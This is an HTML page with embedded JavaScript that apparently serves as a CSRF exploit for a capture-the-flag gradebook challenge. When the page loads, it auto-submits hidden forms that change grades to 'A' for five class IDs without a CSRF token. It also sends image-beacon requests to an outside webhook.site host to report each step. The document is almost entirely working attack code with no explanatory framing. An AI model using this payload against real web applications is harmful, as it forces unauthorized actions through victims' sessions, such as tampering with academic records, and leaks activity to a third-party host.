<!DOCTYPE html>
<html>
<head>
    <title>Grade Update System</title>
</head>
<body>
    <h2>Grade Update Portal</h2>
    <div id="status">Initializing grade change system...</div>
    
    <script>
    // Send initial ping to webhook
    (new Image()).src = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?status=loaded&time=' + Date.now();

    const YOUR_STUDENT_ID = 'cec61aee-395d-4281-af96-cfe05bda466e';
    const YOUR_CLASS_IDS = [
        'e522382b-7643-469c-ae52-ba488f5752c6',
        '5042bbaa-aae3-4bab-b841-2e7beb30c847',
        '8938a046-e7c5-4402-84b7-36980f2eede6',
        'abf7c048-cc3a-4797-9445-57e8cb725e71',
        '19481783-157e-45e1-8592-77efd688144a'
    ];

    let currentIndex = 0;
    const statusEl = document.getElementById('status');

    function updateStatus(message) {
        statusEl.textContent = message;
        console.log(message);
        
        // Send status to webhook via image beacon (no CORS issues)
        (new Image()).src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?msg=${encodeURIComponent(message)}&index=${currentIndex}`;
    }

    function submitGradeForm(classId) {
        updateStatus(`Submitting grade A for class: ${classId.substring(0, 8)}...`);
        
        // Create hidden form - this bypasses CORS completely!
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://gradebook-app.ctf.csaw.io/grade-change';
        form.style.display = 'none';
        
        // Add form fields
        const fields = {
            'student_id': YOUR_STUDENT_ID,
            'class_id': classId,
            'grade': 'A'
            // Note: We're omitting CSRF token initially to see if it works without it
        };
        
        for (const [name, value] of Object.entries(fields)) {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = name;
            input.value = value;
            form.appendChild(input);
        }
        
        // Add form to page and submit
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
        
        // Notify webhook that form was submitted
        (new Image()).src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?form_submitted=yes&class=${classId}`;
    }

    function processNextGrade() {
        if (currentIndex >= YOUR_CLASS_IDS.length) {
            updateStatus('COMPLETED: All grade submissions sent!');
            (new Image()).src = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?status=all_complete';
            return;
        }
        
        const classId = YOUR_CLASS_IDS[currentIndex];
        currentIndex++;
        
        submitGradeForm(classId);
        
        // Schedule next submission with delay
        if (currentIndex < YOUR_CLASS_IDS.length) {
            setTimeout(processNextGrade, 1000);
        }
    }

    // Start the process
    updateStatus('Starting automated grade change...');
    setTimeout(processNextGrade, 1000);
    </script>
</body>
</html>
